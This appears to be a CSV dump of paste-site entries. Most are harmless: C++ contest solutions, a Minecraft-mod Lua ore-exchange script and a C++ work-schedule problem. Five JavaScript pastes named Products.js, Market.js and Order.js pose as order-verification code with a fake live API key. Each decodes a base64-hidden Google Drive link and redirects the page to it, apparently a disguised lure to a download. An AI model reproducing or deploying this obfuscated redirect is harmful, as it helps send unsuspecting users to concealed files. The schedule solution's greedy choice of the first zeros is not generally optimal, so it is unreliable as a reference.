id,title,username,language,date,content
ZuyrUSnm,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 10:51:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/936/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EhVg922G,Untitled,Josif_tepe,C++,Saturday 29th of March 2025 10:37:18 AM CDT,"#include <iostream>
#include <vector>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;

pair<int, int> idx[maxn];
int dist(int i, int j, int ci, int cj) {
    return abs(j - cj) + abs(i - ci);
}
int main() {
    ios_base::sync_with_stdio(false);
    int r, c;
    cin >> r >> c;
    
    vector<vector<int>> mat(r, vector<int>(c));
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            
            idx[cnt] = make_pair(i, j);
            cnt++;
        }
    }
    ll res = 0;
    cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            if(cnt != mat[i][j]) {
                int tmp = cnt;
                pair<int, int> c = make_pair(i, j);
                while(mat[c.first][c.second] != cnt) {
                    res += dist(c.first, c.second, idx[mat[c.first][c.second]].first, idx[mat[c.first][c.second]].second);
                    c = idx[mat[c.first][c.second]];
                }
                
            }
            cnt++;
        }
    }
    cout << res << endl;
    
    
    return 0;
    
}
"
k61PGw8T,艺术与篮球 参考代码,Dmaxiya,C++,Saturday 29th of March 2025 10:32:29 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int ans;
int days[13] = {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
int bihua[10] = {13, 1, 2, 3, 5, 4, 4, 2, 2, 2};

int cal(int x, int dig) {
    int ret = 0;
    for (int i = 0; i < dig; ++i) {
        ret += bihua[x % 10];
        x /= 10;
    }
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    for (int year = 2000; year <= 2024; ++year) {
        if (year % 400 == 0 || (year % 4 == 0 && year % 100 != 0)) {
            days[2] = 29;
        } else {
            days[2] = 28;
        }
        int maxMonth = (year == 2024 ? 4 : 12);
        for (int month = 1; month <= maxMonth; ++month) {
            int maxDay = (year == 2024 && month == 4 ? 13 : days[month]);
            for (int day = 1; day <= maxDay; ++day) {
                if (cal(year, 4) + cal(month, 2) + cal(day, 2) > 50) {
                    ++ans;
                }
            }
        }
    }
    cout << ans << endl;

    return 0;
}"
TLzZj3N2,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 10:20:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/541/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0N9gfHFc,Untitled,GekaYamix,Lua,Saturday 29th of March 2025 10:08:17 AM CDT,"-- Определение списка руд с их параметрами
local items = { -- множитель, название руды, забираем руду, dmg, отдаём слиток, dmg, название слитка, ore_dictionary
  {""3"",""Дракониевая руда"",""DraconicEvolution:draconiumOre"",""0"",""DraconicEvolution:draconiumDust"",""0"",""Дракониевая пыль"",""dustDraconium""},
  {""2"",""Алмазная руда"",""minecraft:diamond_ore"",""0"",""minecraft:diamond"",""0"",""Алмаз"",""gemDiamond""},
  {""2"",""Изумрудная руда"",""minecraft:emerald_ore"",""0"",""minecraft:emerald"",""0"",""Изумруд"",""gemEmerald""},
  {""2"",""Золотая руда"",""minecraft:gold_ore"",""0"",""minecraft:gold_ingot"",""0"",""Золотой слиток"",""ingotGold""},
  {""2"",""Железная руда"",""minecraft:iron_ore"",""0"",""minecraft:iron_ingot"",""0"",""Железный слиток"",""ingotIron""},
  {""2"",""IC2 Медная руда"",""IC2:blockOreCopper"",""0"",""IC2:itemIngot"",""0"",""Медный слиток"",""ingotCopper""},
  {""2"",""IC2 Оловянная руда"",""IC2:blockOreTin"",""0"",""IC2:itemIngot"",""1"",""Оловянный слиток"",""ingotTin""},
  {""2"",""IC2 Свинцовая руда"",""IC2:blockOreLead"",""0"",""IC2:itemIngot"",""5"",""Свинцовый слиток"",""ingotLead""},
  {""2"",""TE Медная руда"",""ThermalFoundation:Ore"",""0"",""ThermalFoundation:material"",""64"",""Медный слиток"",""ingotCopper""},
  {""2"",""TE Оловянная руда"",""ThermalFoundation:Ore"",""1"",""ThermalFoundation:material"",""65"",""Оловянный слиток"",""ingotTin""},
  {""2"",""TE Никелевая руда"",""ThermalFoundation:Ore"",""4"",""ThermalFoundation:material"",""68"",""Никелевый слиток"",""ingotNickel""},
  {""2"",""TE Серебряная руда"",""ThermalFoundation:Ore"",""2"",""ThermalFoundation:material"",""66"",""Серебряный слиток"",""ingotSilver""},
  {""2"",""TE Платиновая руда"",""ThermalFoundation:Ore"",""5"",""ThermalFoundation:material"",""69"",""Платиновый слиток"",""ingotPlatinum""},
  {""2"",""Руда истинного кварца"",""appliedenergistics2:tile.OreQuartz"",""0"",""appliedenergistics2:item.ItemMultiMaterial"",""0"",""Истинный кварц"",""crystalCertusQuartz""},
  {""3"",""Кварцевая руда"",""minecraft:quartz_ore"",""0"",""minecraft:quartz"",""0"",""Кварц"",""gemQuartz""},
  {""8"",""Лазуритовая руда"",""minecraft:lapis_ore"",""0"",""minecraft:dye"",""4"",""Лазурит"",""dye""},
  {""8"",""Красная руда"",""minecraft:redstone_ore"",""0"",""minecraft:redstone"",""0"",""Красная пыль"",""dustRedstone""},
  {""2"",""Угольная руда"",""minecraft:coal_ore"",""0"",""minecraft:coal"",""0"",""Уголь"",""coal""}
}

-- Подключение необходимых библиотек
local unicode = require(""unicode"")
local com = require(""component"")
local event = require(""event"")
local interface = com.isAvailable(""me_interface"") and com.me_interface or error(""нет ме интерфейса"")
local db = com.isAvailable(""database"") and com.database or error(""нет базы данных"")
local chest = com.isAvailable(""chest"") and com.chest or error(""нет сундука"")
local size = chest.getInventorySize()
local gpu = com.gpu
local w, h = gpu.getResolution()
local net_count,line_count = 0,0
local last_update_time = os.time() -- Время последнего обновления
local cached_network = nil -- Кэшированные данные о ресурсах

-- Функция для склонения слов в зависимости от числа
local function declension(number)
  local dec = """"
  local rest = number % 10
  local str = string.sub(number,string.len(number)-1)
  if str == ""11"" or str == ""12"" or str == ""13"" or str == ""14"" then
    dec = "" слитков""
  elseif rest == 1 then
    dec = "" слиток""
  elseif rest == 2 or rest == 3 or rest == 4 then
    dec = "" слитка""
  else
    dec = "" слитков""
  end
  return number..dec
end

-- Функция для центрирования текста на экране
local function center(coord,text,color)
  gpu.setForeground(color)
  local text_len = unicode.len(text)
  local start_pos = math.floor((w - text_len) / 2)
  gpu.set(start_pos, coord, text)
end

-- Функция для вывода цветного текста на экран
local function color_text(w,line,text,color)
  gpu.setForeground(color)
  gpu.set(w,line,text)
end

-- Функция для вывода информации о доступных ресурсах
local function print_items()
  local line,size,fill = 3,0,true
  local network = cached_network or interface.getItemsInNetwork()

  if #network ~= net_count then
    if fill then
      gpu.fill(1,3,w,h-4,"" "") -- Очистка экрана перед выводом информации, оставляя место для заголовка и кнопок
      fill = not fill
    end
  end

  gpu.fill(1,1,w,1,"" "") -- Очистка первой строки
  center(1, ""Доступные ресурсы"", 0x99CCFF) -- Заголовок
  color_text(3, 2, string.rep(""─"", 76), 0x009999) -- Разделительная линия

  for ind = 1,#items do
    for net = 1,#network do
      if network[net].name == items[ind][5] then
        if network[net].damage == tonumber(items[ind][6]) then
          if network[net].size >= tonumber(items[ind][1]) then
            if #network ~= net_count then
              if fill then
                fill = not fill
              end
              color_text(5,line,items[ind][2],0xFF9900) -- Вывод названия руды
              color_text(28,line,""1"",0x3399FF) -- Вывод количества руды
              color_text(30,line,""-->"",0xFF0000) -- Вывод стрелки
              color_text(34,line,""X ""..items[ind][1],0x3399FF) -- Вывод множителя
              color_text(42,line,items[ind][7],0xFF9900) -- Вывод названия слитка
              color_text(63,line,""доступно"",FF9900) -- Вывод текста ""доступно""
              color_text(73,line,tostring(network[net].size),0x3399FF) -- Вывод количества доступных слитков
              --color_text(3,line+1,string.rep(""─"",76),0xFFFFFF) -- Вывод разделительной линии
              size = size + network[net].size -- Увеличение общего количества доступных слитков
            else
              size = size + network[net].size -- Увеличение общего количества доступных слитков
              color_text(73,line,tostring(network[net].size..""   ""),0x3399FF) -- Вывод количества доступных слитков с пробелами
            end
            line = line + 2 -- Переход на следующую строку
          end
        end
      end
    end
  end
  net_count = #network
  if line == 3 or line ~= line_count then
    net_count = 0
  end
  line_count = line
  if size > 0 then
    center(line_count+2,""Обмен ресурсов. Всего доступно ""..declension(size),0x00CCFF) -- Вывод общего количества доступных слитков
  else
    center(h/2,""Обменник ресурсов пустой"",0xFF0000) -- Вывод сообщения, если нет доступных ресурсов
  end
end

-- Функция для отправки предметов в сеть
local function pushItem(name,count,label)
  db.clear(1)
  interface.store(name,db.address,1)
  interface.setInterfaceConfiguration(1,db.address,1,64)
  local drop = 0
  while true do
    if drop == count then
      interface.setInterfaceConfiguration(1,db.address,1,0)
      net_count = 0
      break
    else
      local dropcount = interface.pushItem(""UP"",1,count-drop)
      drop = drop + dropcount
      if dropcount == 0 then
        center(h/2,""освободите место в сундуке"",0xFF0000) -- Вывод сообщения о необходимости освободить место в сундуке
        center(h/2+2,""Ожидаю выдать ""..label,0xFFFFFF) -- Вывод ожидания выдачи предмета
        center(h/2+4,""всего ""..count-drop,0xFFFFFF) -- Вывод общего количества предметов для выдачи
        os.sleep(1)
      end
    end
  end
end

-- Функция для обмена руды на слитки
local function exchange_ore_dict()
  local ore_dict,item_count = """",false
  local data = chest.getAllStacks(0)
  for slot = 1,size do
    if data[slot] then
      for ind = 1,#items do
        if data[slot].id == items[ind][3] then
          if data[slot].dmg == tonumber(items[ind][4]) then
            ore_dict = items[ind][8]
            break
          end
        end
      end
      local network = cached_network or interface.getItemsInNetwork()
      for ind2 = 1,#items do
        if ore_dict == items[ind2][8] then
          local ore = items[ind2][5]
          local dmg = items[ind2][6]
          local ore_name = items[ind2][2]
          for net = 1,#network do
            if network[net].name == ore then
              if network[net].damage == tonumber(dmg) then
                if network[net].size >= tonumber(items[ind2][1]) then
                  item_count = chest.pushItem(""DOWN"",slot,(network[net].size/items[ind2][1]))
                  local drop_count = item_count*items[ind2][1]
                  local ingot_name = items[ind2][7]
                  center(1,""Меняю  ""..item_count..""  ""..ore_name..""  на  ""..drop_count..""  ""..ingot_name,0xFFFFFF) -- Вывод сообщения о обмене руды на слитки
                  pushItem({name = ore,damage = tonumber(dmg)},drop_count,ingot_name)
                  break
                end
              end
            end
          end
          if item_count then
            item_count = false
            ore_dict = """"
            break
          end
        end
      end
    end
  end
  -- Обновление экрана после обмена
  print_items()
end

-- Функция для отображения кнопок
local function draw_buttons()
  local button_y = h - 2
  gpu.setForeground(0x006633)
  gpu.set(40, button_y, ""⬤"")
  gpu.setForeground(0xFFFFFF)
  gpu.set(42, button_y, "" Edit"")
  gpu.setForeground(0x0066CC)
  gpu.set(55, button_y, ""⬤"")
  gpu.setForeground(0xFFFFFF)
  gpu.set(57, button_y, "" Reboot"")
  gpu.setForeground(0x990000)
  gpu.set(70, button_y, ""⬤"")
  gpu.setForeground(0xFFFFFF)
  gpu.set(72, button_y, "" Exit"")
end

-- Основной цикл программы
gpu.fill(1,1,w,h,"" "")
gpu.setResolution(80,h)
draw_buttons()
while true do
  local current_time = os.time()
  if current_time - last_update_time >= 5 then -- Обновление каждые 5 секунд
    cached_network = interface.getItemsInNetwork() -- Кэширование данных о ресурсах
    print_items() -- Вывод информации о доступных ресурсах
    draw_buttons() -- Перерисовка кнопок после обновления
    last_update_time = current_time
  end
  exchange_ore_dict() -- Обмен руды на слитки
  os.sleep(0.5) -- Пауза на 0.5 секунды перед следующей итерацией

  -- Обработка событий нажатия клавиш
  local _, _, key = event.pull(0.5, ""key_down"")
  if key then
    if key == 49 then -- Кнопка 1 (Редактировать код)
      os.execute(""edit start.lua"")
    elseif key == 50 then -- Кнопка 2 (Перезагрузить программу)
      os.execute(""reboot"")
    elseif key == 51 then -- Кнопка 3 (Закрыть программу)
      os.exit()
    end
  end
end"
tiqLNNMR,五子棋对弈 参考代码,Dmaxiya,C++,Saturday 29th of March 2025 10:00:19 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int ans;
int board[maxn][maxn];

bool judge(int x, int y) {
    if (x != 4 && y != 4) {
        return true;
    }

    bool allSame = true;
    if (x == 4) {
        for (int i = 0; i < 5; ++i) {
            if (board[i][y] != board[x][y]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    allSame = true;
    if (y == 4) {
        for (int i = 0; i < 5; ++i) {
            if (board[x][i] != board[x][y]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    allSame = true;
    if (x == 4 && y == 0) {
        for (int i = 0; i < 5; ++i) {
            if (board[i][4 - i] != board[4][0]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    allSame = true;
    if (x == 4 && y == 4) {
        for (int i = 0; i < 5; ++i) {
            if (board[i][i] != board[4][4]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    return true;
}

void dfs(int depth, int white, int black) {
    if (depth == 25) {
        ++ans;
        return ;
    }
    int x = depth / 5;
    int y = depth % 5;
    if (white > 0) {
        board[x][y] = 0;
        if (judge(x, y)) {
            dfs(depth + 1, white - 1, black);
        }
    }
    if (black > 0) {
        board[x][y] = 1;
        if (judge(x, y)) {
            dfs(depth + 1, white, black - 1);
        }
    }
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    dfs(0, 13, 12);
    cout << ans << endl;

    return 0;
}"
GxB1emFR,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 09:49:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/295/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H7utwUik,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 09:34:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/346/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nshXcAHd,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 09:18:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/459/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
keV37Ahr,getMaxEarnings,adityasuman100,C++,Saturday 29th of March 2025 09:10:05 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

using namespace std;

long getMaxEarnings(string schedule, int k, int fixedPay, int bonus) {
    int n = schedule.size();
    vector<int> zeroIndices;
    
    // Store the indices of '0's
    for (int i = 0; i < n; i++) {
        if (schedule[i] == '0') {
            zeroIndices.push_back(i);
        }
    }
    
    // If k is greater than or equal to the number of '0's, make all '0's '1'
    int zeroCount = zeroIndices.size();
    if (k >= zeroCount) {
        fill(schedule.begin(), schedule.end(), '1');
    } else {
        for (int i = 0; i < k; i++) {
            schedule[zeroIndices[i]] = '1';
        }
    }
    
    // Calculate earnings
    long earnings = 0;
    if (schedule[0] == '1') {
        earnings += fixedPay;
    }
    
    for (int i = 1; i < n; i++) {
        if (schedule[i] == '1') {
            earnings += fixedPay;
            if (schedule[i - 1] == '1') {
                earnings += bonus;
            }
        }
    }
    
    return earnings;
}

int main() {
    cout << getMaxEarnings(""10100"", 2, 1, 2) << endl; // Output: 10
    cout << getMaxEarnings(""100101"", 2, 4, 3) << endl; // Output: 29
    cout << getMaxEarnings(""1111001"", 1, 3, 3) << endl; // Output: 30
    return 0;
}





In a company, an employee receives a fixed amount, fixedPay dollars, each day they work. They also receive a bonus, bonus dollars, on a workday if they worked the day before. The employee is planning their work schedule for n days.

Their schedule is given as a binary string schedule where '1"" is a workday, and 'O"" is not. The employee can change up to k days off ('0) to workdays (*1"").

Find the maximum earnings the employee can get after changing at most k days from 'O' to '1'.

Example n =5

k= 2

fixedPay = 1

bonus = 2

schedule =""10100""

An optimal way to change the schedule is to work on the second and fourth days. In this case, the schedule becomes ""11110"".

﻿﻿On the first day, earnings - fixedPay = 1.

﻿﻿On days 2, 3, and 4, earnings - fixedPay + bonus = 3.

Total earnings = 1 + 3 + 3 + 3 + 0 = 10. Return 10.

Function Description

Complete the function getMaxEarnings in the editor with the following parameters:

string schedule: initial work schedule

int k: the maximum number of extra days the employee can work int fixedPay: the fixed pay for each workday

int bonus: the bonus if they also worked the previous day

Returns

long: the maximum earnings possible

sample 0

schedule = ""100101""

k = 2

fixedPay = 4

bonus = 3

output

29

An optimal schedule is to work on the second and third days too, so the schedule is ""111101"".

﻿﻿On the first day, earnings = fixedPay = 4.

﻿﻿On days 2, 3, and 4, earnings = fixedPay + bonus = 7.

﻿﻿On day 5, earnings - fixedPay = 4.

Total earnings = 4 + 7 + 7 + 7 + 0 + 4 = 29.

sample 1

schedule = ""1111001""

k = 1

fixedPay = 3

bonus = 3

output

30

Explanation

An optimal schedule is to also work on the fifth day, so the schedule is *1111101"".

﻿﻿On the first day, earnings = fixedPay = 3.

﻿﻿On days 2, 3, 4, and 5 earnings - fixedPay + bonus - 6.

﻿﻿On day 6, earnings = fixedPay = 3.

Total earnings = 3 + 6 + 6 + 6 + 6 + 0 + 3 = 30.

solve in c++"
